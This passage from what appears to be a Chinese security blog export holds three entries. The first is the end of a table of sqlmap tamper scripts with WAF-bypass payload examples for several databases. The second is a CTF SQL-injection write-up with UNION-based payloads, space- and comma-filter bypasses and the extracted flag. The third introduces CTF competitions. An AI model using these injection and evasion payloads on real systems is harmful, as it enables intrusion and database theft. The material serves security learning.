style="font-size:11pt;vertical-align:middle;width:210.75pt;">代替空格字符后与一个有效的随机空白字符的SQL语句。<br>然后替换=为like</td><td class="et22" style="font-size:11pt;vertical-align:middle;width:251.25pt;">('SELECT id FROM users where id = 1')<br>'SELECT%09id FROM users where id LIKE 1'</td></tr><tr><td class="et19" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">12</td><td class="et27" style="font-size:11pt;text-align:center;vertical-align:middle;width:166.5pt;">percentage.py</td><td class="et24" style="font-size:10.5pt;vertical-align:middle;width:210.75pt;">asp允许每个字符前面添加一个%号</td><td class="et22" style="font-size:11pt;vertical-align:middle;width:251.25pt;">* Input: SELECT FIELD FROM TABLE<br>* Output: %S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E</td></tr><tr><td class="et19" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">13</td><td class="et27" style="font-size:11pt;text-align:center;vertical-align:middle;width:166.5pt;">charencode.py</td><td class="et21" style="font-size:11pt;vertical-align:middle;width:210.75pt;">url编码</td><td class="et22" style="font-size:11pt;vertical-align:middle;width:251.25pt;">* Input: SELECT FIELD FROM%20TABLE<br>* Output: %53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45</td></tr><tr><td class="et19" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">14</td><td class="et27" style="font-size:11pt;text-align:center;vertical-align:middle;width:166.5pt;">randomcase.py</td><td class="et24" style="font-size:10.5pt;vertical-align:middle;width:210.75pt;">随机大小写</td><td class="et25" style="font-size:10.5pt;vertical-align:middle;width:251.25pt;">* Input: INSERT<br>* Output: InsERt</td></tr><tr><td class="et19" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">15</td><td class="et27" style="font-size:11pt;text-align:center;vertical-align:middle;width:166.5pt;">versionedkeywords.py</td><td class="et21" style="font-size:11pt;vertical-align:middle;width:210.75pt;">Encloses each non-function keyword with versioned MySQL comment</td><td class="et22" style="font-size:11pt;vertical-align:middle;width:251.25pt;">* Input: 1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))#<br>* Output: 1/*!UNION**!ALL**!SELECT**!NULL*/,/*!NULL*/, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/*!AS**!CHAR*/),CHAR(32)),CHAR(58,100,114,117,58))#</td></tr><tr><td class="et19" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">16</td><td class="et27" style="font-size:11pt;text-align:center;vertical-align:middle;width:166.5pt;">space2comment.py</td><td class="et24" style="font-size:10.5pt;vertical-align:middle;width:210.75pt;">Replaces space character (‘ ‘) with comments ‘/* */’</td><td class="et22" style="font-size:11pt;vertical-align:middle;width:251.25pt;">* Input: SELECT id FROM users<br>* Output: SELECT//id//FROM/* */users</td></tr><tr><td class="et19" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">17</td><td class="et27" style="font-size:11pt;text-align:center;vertical-align:middle;width:166.5pt;">charunicodeencode.py</td><td class="et21" style="font-size:11pt;vertical-align:middle;width:210.75pt;">字符串 unicode 编码</td><td class="et22" style="font-size:11pt;vertical-align:middle;width:251.25pt;">* Input: SELECT FIELD%20FROM TABLE<br>* Output: %u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045′</td></tr><tr><td class="et19" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">18</td><td class="et27" style="font-size:11pt;text-align:center;vertical-align:middle;width:166.5pt;">versionedmorekeywords.py</td><td class="et24" style="font-size:10.5pt;vertical-align:middle;width:210.75pt;">注释绕过</td><td class="et22" style="font-size:11pt;vertical-align:middle;width:251.25pt;">* Input: 1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,122,114,115,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,115,114,121,58))#<br>* Output: 1/*!UNION**!ALL**!SELECT**!NULL*/,/*!NULL*/,/*!CONCAT*/(/*!CHAR*/(58,122,114,115,58),/*!IFNULL*/(CAST(/*!CURRENT_USER*/()/*!AS**!CHAR*/),/*!CHAR*/(32)),/*!CHAR*/(58,115,114,121,58))#</td></tr><tr><td class="et28" rowspan="2" style="font-size:20pt;text-align:center;vertical-align:middle;width:77.25pt;">MySQL &lt; 5.1</td><td class="et19" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">19</td><td class="et27" style="font-size:11pt;text-align:center;vertical-align:middle;width:166.5pt;">halfversionedmorekeywords.py</td><td class="et29" style="font-size:11pt;vertical-align:middle;width:210.75pt;">关键字前加注释</td><td class="et22" style="font-size:11pt;vertical-align:middle;width:251.25pt;">* Input: value’ UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND ‘QDWa’='QDWa<br>* Output: value’/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)), NULL, NULL#/*!0AND ‘QDWa’='QDWa</td></tr><tr><td class="et19" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">20</td><td class="et27" style="font-size:11pt;text-align:center;vertical-align:middle;width:166.5pt;">halfversionedmorekeywords.py</td><td class="et21" style="font-size:11pt;vertical-align:middle;width:210.75pt;">当数据库为mysql时绕过防火墙，每个关键字之前添加<br>mysql版本评论</td><td class="et22" style="font-size:11pt;vertical-align:middle;width:251.25pt;">1.("value' UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND 'QDWa'='QDWa")<br>2."value'/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)),/*!0NULL,/*!0NULL#/*!0AND 'QDWa'='QDWa"</td></tr><tr><td class="et28" style="font-size:20pt;text-align:center;vertical-align:middle;width:77.25pt;">MySQL &gt;= 5.1.13</td><td class="et19" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">21</td><td class="et27" style="font-size:11pt;text-align:center;vertical-align:middle;width:166.5pt;">space2morehash.py</td><td class="et29" style="font-size:11pt;vertical-align:middle;width:210.75pt;">空格替换为 #号 以及更多随机字符串 换行符</td><td class="et30" style="font-size:11pt;vertical-align:bottom;width:251.25pt;">* Input: 1 AND 9227=9227<br>* Output: 1%23PTTmJopxdWJ%0AAND%23cWfcVRPV%0A9227=9227</td></tr><tr><td class="et31" rowspan="7" style="font-size:20pt;text-align:center;vertical-align:middle;width:77.25pt;"> Oracle</td><td class="et32" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">1</td><td class="et33" style="font-size:10.5pt;text-align:center;vertical-align:middle;width:166.5pt;">greatest.py</td><td class="et34" style="font-size:10.5pt;vertical-align:middle;width:210.75pt;"><span class="font17">绕过过滤</span><span class="font3">’&gt;’ ,</span><span class="font17">用</span><span class="font3">GREATEST</span><span class="font17">替换大于号。</span></td><td class="et35" style="font-size:10.5pt;vertical-align:middle;width:251.25pt;">('1 AND A &gt; B')<br>'1 AND GREATEST(A,B+1)=A'</td></tr><tr><td class="et32" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">2</td><td class="et33" style="font-size:10.5pt;text-align:center;vertical-align:middle;width:166.5pt;">apostrophenullencode.py</td><td class="et34" style="font-size:10.5pt;vertical-align:middle;width:210.75pt;">绕过过滤双引号，替换字符和双引号。</td><td class="et36" style="font-size:11pt;vertical-align:middle;width:251.25pt;">tamper("1 AND '1'='1")<br><br>'1 AND %00%271%00%27=%00%271'</td></tr><tr><td class="et32" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">3</td><td class="et33" style="font-size:10.5pt;text-align:center;vertical-align:middle;width:166.5pt;">between.py</td><td class="et37" style="font-size:11pt;vertical-align:middle;width:210.75pt;">用between替换大于号（&gt;）</td><td class="et36" style="font-size:11pt;vertical-align:middle;width:251.25pt;">('1 AND A &gt; B--')<br>'1 AND A NOT BETWEEN 0 AND B--'</td></tr><tr><td class="et32" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">4</td><td class="et33" style="font-size:10.5pt;text-align:center;vertical-align:middle;width:166.5pt;">charencode.py</td><td class="et37" style="font-size:11pt;vertical-align:middle;width:210.75pt;">url编码</td><td class="et36" style="font-size:11pt;vertical-align:middle;width:251.25pt;">* Input: SELECT FIELD FROM%20TABLE<br>* Output: %53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45</td></tr><tr><td class="et32" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">5</td><td class="et33" style="font-size:10.5pt;text-align:center;vertical-align:middle;width:166.5pt;">randomcase.py</td><td class="et37" style="font-size:11pt;vertical-align:middle;width:210.75pt;">随机大小写</td><td class="et35" style="font-size:10.5pt;vertical-align:middle;width:251.25pt;">* Input: INSERT<br>* Output: InsERt</td></tr><tr><td class="et38" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">6</td><td class="et33" style="font-size:10.5pt;text-align:center;vertical-align:middle;width:166.5pt;">charunicodeencode.py</td><td class="et37" style="font-size:11pt;vertical-align:middle;width:210.75pt;">字符串 unicode 编码</td><td class="et36" style="font-size:11pt;vertical-align:middle;width:251.25pt;">* Input: SELECT FIELD%20FROM TABLE<br>* Output: %u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045′</td></tr><tr><td class="et32" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">7</td><td class="et33" style="font-size:10.5pt;text-align:center;vertical-align:middle;width:166.5pt;">space2comment.py</td><td class="et37" style="font-size:11pt;vertical-align:middle;width:210.75pt;">Replaces space character (‘ ‘) with comments ‘/**/’</td><td class="et36" style="font-size:11pt;vertical-align:middle;width:251.25pt;">* Input: SELECT id FROM users<br>* Output: SELECT//id//FROM/**/users</td></tr><tr><td class="et39" rowspan="8" style="font-size:20pt;text-align:center;vertical-align:middle;width:77.25pt;"> PostgreSQL</td><td class="et40" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">1</td><td class="et41" style="font-size:10.5pt;text-align:center;vertical-align:middle;width:166.5pt;">greatest.py</td><td class="et42" style="font-size:10.5pt;vertical-align:middle;width:210.75pt;"><span class="font21">绕过过滤</span><span class="font9">’&gt;’ ,</span><span class="font21">用</span><span class="font9">GREATEST</span><span class="font21">替换大于号。</span></td><td class="et43" style="font-size:10.5pt;vertical-align:middle;width:251.25pt;">('1 AND A &gt; B')<br>'1 AND GREATEST(A,B+1)=A'</td></tr><tr><td class="et40" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">2</td><td class="et41" style="font-size:10.5pt;text-align:center;vertical-align:middle;width:166.5pt;">apostrophenullencode.py</td><td class="et42" style="font-size:10.5pt;vertical-align:middle;width:210.75pt;">绕过过滤双引号，替换字符和双引号。</td><td class="et44" style="font-size:11pt;vertical-align:middle;width:251.25pt;">tamper("1 AND '1'='1")<br><br>'1 AND %00%271%00%27=%00%271'</td></tr><tr><td class="et40" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">3</td><td class="et41" style="font-size:10.5pt;text-align:center;vertical-align:middle;width:166.5pt;">between.py</td><td class="et45" style="font-size:11pt;vertical-align:bottom;width:210.75pt;">用between替换大于号（&gt;）</td><td class="et44" style="font-size:11pt;vertical-align:middle;width:251.25pt;">('1 AND A &gt; B--')<br>'1 AND A NOT BETWEEN 0 AND B--'</td></tr><tr><td class="et40" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">4</td><td class="et41" style="font-size:10.5pt;text-align:center;vertical-align:middle;width:166.5pt;">percentage.py</td><td class="et45" style="font-size:11pt;vertical-align:bottom;width:210.75pt;">asp允许每个字符前面添加一个%号</td><td class="et44" style="font-size:11pt;vertical-align:middle;width:251.25pt;">* Input: SELECT FIELD FROM TABLE<br>* Output: %S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E</td></tr><tr><td class="et40" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">5</td><td class="et41" style="font-size:10.5pt;text-align:center;vertical-align:middle;width:166.5pt;">charencode.py</td><td class="et45" style="font-size:11pt;vertical-align:bottom;width:210.75pt;">url编码</td><td class="et44" style="font-size:11pt;vertical-align:middle;width:251.25pt;">* Input: SELECT FIELD FROM%20TABLE<br>* Output: %53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45</td></tr><tr><td class="et40" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">6</td><td class="et41" style="font-size:10.5pt;text-align:center;vertical-align:middle;width:166.5pt;">randomcase.py</td><td class="et45" style="font-size:11pt;vertical-align:bottom;width:210.75pt;">随机大小写</td><td class="et43" style="font-size:10.5pt;vertical-align:middle;width:251.25pt;">* Input: INSERT<br>* Output: InsERt</td></tr><tr><td class="et46" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">7</td><td class="et41" style="font-size:10.5pt;text-align:center;vertical-align:middle;width:166.5pt;">charunicodeencode.py</td><td class="et45" style="font-size:11pt;vertical-align:bottom;width:210.75pt;">字符串 unicode 编码</td><td class="et44" style="font-size:11pt;vertical-align:middle;width:251.25pt;">* Input: SELECT FIELD%20FROM TABLE<br>* Output: %u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045′</td></tr><tr><td class="et40" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">8</td><td class="et41" style="font-size:10.5pt;text-align:center;vertical-align:middle;width:166.5pt;">space2comment.py</td><td class="et47" style="font-size:11pt;vertical-align:bottom;width:210.75pt;">Replaces space character (‘ ‘) with comments ‘/**/’</td><td class="et44" style="font-size:11pt;vertical-align:middle;width:251.25pt;">* Input: SELECT id FROM users<br>* Output: SELECT//id//FROM/**/users</td></tr><tr><td class="et48" style="font-size:20pt;text-align:center;vertical-align:middle;width:77.25pt;">Access</td><td class="et3" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">1</td><td class="et49" style="font-size:11pt;text-align:center;vertical-align:middle;width:166.5pt;">appendnullbyte.py</td><td class="et50" style="font-size:11pt;vertical-align:middle;width:210.75pt;">在有效负荷结束位置加载零字节字符编码</td><td class="et51" style="font-size:11pt;vertical-align:middle;width:251.25pt;">('1 AND 1=1')<br>'1 AND 1=1%00'</td></tr><tr><td class="et52" rowspan="3" style="font-size:20pt;text-align:center;vertical-align:middle;width:77.25pt;">其他</td><td class="et53" style="font-size:11pt;vertical-align:bottom;width:48pt;"> </td><td class="et54" style="font-size:11pt;text-align:center;vertical-align:middle;width:166.5pt;">chardoubleencode.py</td><td class="et55" style="font-size:11pt;vertical-align:middle;width:210.75pt;">双url编码(不处理以编码的)</td><td class="et56" style="font-size:11pt;vertical-align:bottom;width:251.25pt;">* Input: SELECT FIELD FROM%20TABLE<br>* Output: %2553%2545%254c%2545%2543%2554%2520%2546%2549%2545%254c%2544%2520%2546%2552%254f%254d%2520%2554%2541%2542%254c%2545</td></tr><tr><td class="et53" style="font-size:11pt;vertical-align:bottom;width:48pt;"> </td><td class="et54" style="font-size:11pt;text-align:center;vertical-align:middle;width:166.5pt;">unmagicquotes.py</td><td class="et55" style="font-size:11pt;vertical-align:middle;width:210.75pt;">宽字符绕过 GPC  addslashes</td><td class="et56" style="font-size:11pt;vertical-align:bottom;width:251.25pt;">* Input: 1′ AND 1=1<br>* Output: 1%bf%27 AND 1=1–%20</td></tr><tr><td class="et53" style="font-size:11pt;vertical-align:bottom;width:48pt;"> </td><td class="et54" style="font-size:11pt;text-align:center;vertical-align:middle;width:166.5pt;">randomcomments.py</td><td class="et55" style="font-size:11pt;vertical-align:middle;width:210.75pt;">用/**/分割sql关键字</td><td class="et56" style="font-size:11pt;vertical-align:bottom;width:251.25pt;">‘INSERT’ becomes ‘IN//S//ERT’</td></tr></tbody></table></div>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sqlmap </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>sql注入</title>
      <link href="/2018/08-13-sql-injection.html"/>
      <url>/2018/08-13-sql-injection.html</url>
      <content type="html"><![CDATA[<h1 id="一、information-schema库详细介绍"><a href="#一、information-schema库详细介绍" class="headerlink" title="一、information_schema库详细介绍"></a>一、information_schema库详细介绍</h1><blockquote><p>information_schema.COLUMNS里存了所有数据库系统的库名和表名<br>TABLE_SCHEMA库名<br>TABLE_NAME表名<br>COLUMN_NAME列名</p></blockquote><table><tbody><tr><th>列名</th><th>数据类型</th><th>描述</th></tr><tr><td><strong>TABLE_CATALOG</strong></td><td><strong>nvarchar(128)</strong></td><td>表限定符。</td></tr><tr><td><span style="background-color:#ffff00;"><strong>TABLE_SCHEMA</strong></span></td><td><span style="background-color: #ffff00;"><strong>nvarchar(128)</strong></span></td><td width="41%"><span style="background-color: #ffff00;">表所有者。</span></td></tr><tr valign="top"><td><span style="background-color: #ffff00;"><strong>TABLE_NAME</strong></span></td><td width="23%"><span style="background-color: #ffff00;"><strong>nvarchar(128)</strong></span></td><td width="41%"><span style="background-color: #ffff00;">表名。</span></td></tr><tr valign="top"><td width="36%"><span style="background-color: #ffff00;"><strong>COLUMN_NAME</strong></span></td><td width="23%"><span style="background-color: #ffff00;"><strong>nvarchar(128)</strong></span></td><td width="41%"><span style="background-color: #ffff00;">列名。</span></td></tr><tr valign="top"><td width="36%"><strong>ORDINAL_POSITION</strong></td><td width="23%"><strong>smallint</strong></td><td width="41%">列标识号。</td></tr><tr valign="top"><td width="36%"><strong>COLUMN_DEFAULT</strong></td><td width="23%"><strong>nvarchar(4000)</strong></td><td width="41%">列的默认值。</td></tr><tr valign="top"><td width="36%"><strong>IS_NULLABLE</strong></td><td width="23%"><strong>varchar(3)</strong></td><td width="41%">列的为空性。如果列允许 NULL，那么该列返回 YES。否则，返回 NO。</td></tr><tr valign="top"><td width="36%"><strong>DATA_TYPE</strong></td><td width="23%"><strong>nvarchar(128)</strong></td><td width="41%">系统提供的数据类型。</td></tr><tr valign="top"><td width="36%"><strong>CHARACTER_MAXIMUM_LENGTH</strong></td><td width="23%"><strong>smallint</strong></td><td width="41%">以字符为单位的最大长度，适于二进制数据、字符数据，或者文本和图像数据。否则，返回 NULL。</td></tr><tr valign="top"><td width="36%"><strong>CHARACTER_OCTET_LENGTH</strong></td><td width="23%"><strong>smallint</strong></td><td width="41%">以字节为单位的最大长度，适于二进制数据、字符数据，或者文本和图像数据。否则，返回 NULL。</td></tr><tr valign="top"><td width="36%"><strong>NUMERIC_PRECISION</strong></td><td width="23%"><strong>tinyint</strong></td><td width="41%">近似数字数据、精确数字数据、整型数据或货币数据的精度。否则，返回 NULL。</td></tr><tr valign="top"><td width="36%"><strong>NUMERIC_PRECISION_RADIX</strong></td><td width="23%"><strong>smallint</strong></td><td width="41%">近似数字数据、精确数字数据、整型数据或货币数据的精度基数。否则，返回 NULL。</td></tr><tr valign="top"><td width="36%"><strong>NUMERIC_SCALE</strong></td><td width="23%"><strong>tinyint</strong></td><td width="41%">近似数字数据、精确数字数据、整数数据或货币数据的小数位数。否则，返回 NULL。</td></tr><tr valign="top"><td width="36%"><strong>DATETIME_PRECISION</strong></td><td width="23%"><strong>smallint</strong></td><td width="41%"><strong>datetime</strong> 及 SQL-92<strong> interval </strong>数据类型的子类型代码。对于其它数据类型，返回 NULL。</td></tr><tr valign="top"><td width="36%"><strong>CHARACTER_SET_CATALOG</strong></td><td width="23%"><strong>varchar(6)</strong></td><td width="41%">如果列是字符数据或 <strong>text</strong> 数据类型，那么返回 <strong>master</strong>，指明字符集所在的数据库。否则，返回 NULL。</td></tr><tr valign="top"><td width="36%"><strong>CHARACTER_SET_SCHEMA</strong></td><td width="23%"><strong>varchar(3)</strong></td><td width="41%">如果列是字符数据或 <strong>text </strong>数据类型，那么返回 <strong>DBO</strong>，指明字符集的所有者名称。否则，返回 NULL。</td></tr><tr valign="top"><td width="36%"><strong>CHARACTER_SET_NAME</strong></td><td width="23%"><strong>nvarchar(128)</strong></td><td width="41%">如果该列是字符数据或 <strong>text</strong> 数据类型，那么为字符集返回唯一的名称。否则，返回 NULL。</td></tr><tr valign="top"><td width="36%"><strong>COLLATION_CATALOG</strong></td><td width="23%"><strong>varchar(6)</strong></td><td width="41%">如果列是字符数据或 <strong>text </strong>数据类型，那么返回 <strong>master</strong>，指明在其中定义排序次序的数据库。否则此列为 NULL。</td></tr><tr valign="top"><td width="36%"><strong>COLLATION_SCHEMA</strong></td><td width="23%"><strong>varchar(3)</strong></td><td width="41%">返回 <strong>DBO</strong>，为字符数据或 <strong>text </strong>数据类型指明排序次序的所有者。否则，返回 NULL。</td></tr><tr valign="top"><td width="36%"><strong>COLLATION_NAME</strong></td><td width="23%"><strong>nvarchar(128)</strong></td><td width="41%">如果列是字符数据或 <strong>text</strong> 数据类型，那么为排序次序返回唯一的名称。否则，返回 NULL。</td></tr><tr valign="top"><td width="36%"><strong>DOMAIN_CATALOG</strong></td><td width="23%"><strong>nvarchar(128)</strong></td><td width="41%">如果列是一种用户定义数据类型，那么该列是某个数据库名称，在该数据库名中创建了这种用户定义数据类型。否则，返回 NULL。</td></tr><tr valign="top"><td width="36%"><strong>DOMAIN_SCHEMA</strong></td><td width="23%"><strong>nvarchar(128)</strong></td><td width="41%">如果列是一种用户定义数据类型，那么该列是这种用户定义数据类型的创建者。否则，返回 NULL。</td></tr><tr valign="top"><td width="36%"><strong>DOMAIN_NAME</strong></td><td width="23%"><strong>nvarchar(128)</strong></td><td width="41%"><p>如果列是一种用户定义数据类型，那么该列是这种用户定义数据类型的名称。否则，返回 NULL。</p></td></tr></tbody></table><hr># sql注入(空格过滤)以过滤空格实验为例子（空格可以用/**/替换）<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ctf5.shiyanbar.com/web/index_2.php?</span><br></pre></td></tr></table></figure><p>1.二分爆显示位</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;order/**/by/**/1#</span><br></pre></td></tr></table></figure><p>大于1的时候报错：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Unknown column &apos;2&apos; in &apos;order clause&apos;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">为1的时候无显示正确，即当前只有一个显示位</span><br></pre></td></tr></table></figure><p>2.爆所有的数据库，显示在第一行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4&apos;union/**/select/**/mid(group_concat(distinct/**/table_schema),1,100)/**/from/**/information_schema.columns#</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ID: 4&apos;union/**/select/**/mid(group_concat(distinct/**/table_schema),1,100)/**/from/**/information_schema.columns#</span><br><span class="line">name: information_schema,test,web1</span><br></pre></td></tr></table></figure><p>3.爆web1的所有表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;union/**/select/**/group_concat(distinct/**/table_name)/**/from/**/information_schema.columns/**/where/**/table_schema=&apos;web1&apos;#</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ID: &apos;union/**/select/**/group_concat(distinct/**/table_name)/**/from/**/information_schema.columns/**/where/**/table_schema=&apos;web1&apos;#</span><br><span class="line">name: flag,web_1</span><br></pre></td></tr></table></figure><p>4.爆数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4&apos;union/**/select/**/flag/**/from/**/web1.flag#</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ID: 4&apos;union/**/select/**/flag/**/from/**/web1.flag#</span><br><span class="line">name: flag&#123;Y0u_@r3_5O_dAmn_90Od&#125;</span><br></pre></td></tr></table></figure><h1 id="sql注入-不用逗号"><a href="#sql注入-不用逗号" class="headerlink" title="sql注入(不用逗号)"></a>sql注入(不用逗号)</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://a0e139e4e386402daac82ca824f96de2840a49a8d1e54121.game.ichunqiu.com/l0gin.php?id=<span class="string">' union select * from (select group_concat(distinct(table_schema)) from information_schema.tables ) a join (select version() ) b %23</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d=&apos; union select * from (select group_concat(table_name ) from information_schema.tables where table_schema = &apos;sqli&apos; ) a join (select version() ) b %23</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id = &apos; union select * from (select group_concat(column_name ) from information_schema.columns where table_name = &apos;users&apos; ) a join (select version() ) b %23</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=&apos; union select * from (select group_concat(flag_9c861b688330 ) from users ) a join (select version() ) b %23</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql-injection </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>CTF简介</title>
      <link href="/2018/08-12-CTF.html"/>
      <url>/2018/08-12-CTF.html</url>
      <content type="html"><![CDATA[<h1 id="CTF-的起源"><a href="#CTF-的起源" class="headerlink" title="CTF 的起源"></a>CTF 的起源</h1><p>CTF 的前身是传统黑客之间网络技术比拼的游戏，起源于 1996 年第四届 DEFCON。</p><hr><h2 id="早期-CTF-竞赛"><a href="#早期-CTF-竞赛" class="headerlink" title="早期 CTF 竞赛"></a>早期 CTF 竞赛</h2><p>最开始的 CTF 比赛（1996 年-2001 年），没有明确的比赛规则，没有专业搭建的比赛平台与环境。由参数队伍各自准备比赛目标（自己准备的比赛目标自己防守并要尝试攻破对方提供的比赛目标）。而组织者大都只是一些非专业的志愿者，接受参赛队伍请求手工计分。<br>没有后台自动系统支持和裁判技术能力认定，计分延迟和误差以及不可靠的网络和不当的配置，导致比赛带来了极大的争论与不满。</p><h2 id="「现代」CTF-竞赛"><a href="#「现代」CTF-竞赛" class="headerlink" title="「现代」CTF 竞赛"></a>「现代」CTF 竞赛</h2><p>由专业队伍承担比赛平台、命题、赛事组织以及自动化积分系统。参赛队伍需提交参赛申请，由 DEFCON 会议组织者们进行评选。<br>就 LegitBS 组织的三年 DEFCON CTF 比赛而言，有以下突出特点：<br>比赛侧重于对计算机底层和系统安全核心能力，Web 漏洞攻防技巧完全不受重视。<br>竞赛环境趋向多 CPU 指令架构集，多操作系统，多编程语言。<br>采用「零和」计分规则。<br>团队综合能力考研：逆向分析、漏洞挖掘、漏洞利用、漏洞修补加固、网络流量分析、系统安全运维以及面向安全的编程调试。</p><hr><h1 id="CTF赛事介绍"><a href="#CTF赛事介绍" class="headerlink" title="CTF赛事介绍"></a>CTF赛事介绍</h1><p>CTF是一种流行的信息安全竞赛形式，其英文名可直译为“夺得Flag”，也可意译为“夺旗赛”。其大致流程是，参赛团队之间通过进行攻防对抗、程序分析等形式，率先从主办方给出的比赛环境中得到一串具有一定格式的字符串或其他内容，并将其提交给主办方，从而夺得分数。为了方便称呼，我们把这样的内容称之为“Flag”。</p><h1 id="CTF竞赛模式具体分为以下三类"><a href="#CTF竞赛模式具体分为以下三类" class="headerlink" title="CTF竞赛模式具体分为以下三类"></a>CTF竞赛模式具体分为以下三类</h1><h2 id="解题模式（Jeopardy）"><a href="#解题模式（Jeopardy）" class="headerlink" title="解题模式（Jeopardy）"></a>解题模式（Jeopardy）</h2><p>在解题模式CTF赛制中，参赛队伍可以通过互联网或者现场网络参与，这种模式的CTF竞赛与ACM编程竞赛、信息学奥赛比较类似，以解决网络安全技术挑战题目的分值和时间来排名，通常用于在线选拔赛。题目主要包含逆向、漏洞挖掘与利用、Web渗透、密码、取证、隐写、安全编程等类别。</p><h2 